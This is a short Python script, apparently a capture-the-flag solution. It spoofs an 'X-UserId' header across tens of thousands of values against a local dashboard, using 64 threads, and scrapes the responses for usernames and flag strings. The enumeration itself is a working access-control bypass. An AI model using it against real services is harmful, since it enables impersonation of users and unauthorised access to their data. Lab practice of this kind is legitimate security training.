import urllib.request, concurrent.futures
base='http://127.0.0.1:32779/dashboard'
def check(i):
    req=urllib.request.Request(base, headers={'X-UserId':str(i)})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            b=r.read().decode()
            if 'Welcome' in b or 'FLAG{' in b:
                import re
                m=re.search(r'Welcome, ([^<]*)',b)
                f=re.search(r'FLAG\{[^}]*\}',b)
                return (i, m.group(1) if m else '', f.group(0) if f else '')
    except Exception as e:
        pass
    return None
ranges=list(range(1,20001))+list(range(100000,100101))+[9999,100000,100001,20000,12345,54321,100320,1032,320,32,0,99999,999999]
with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
    for res in ex.map(check, ranges):
        if res: print(res)
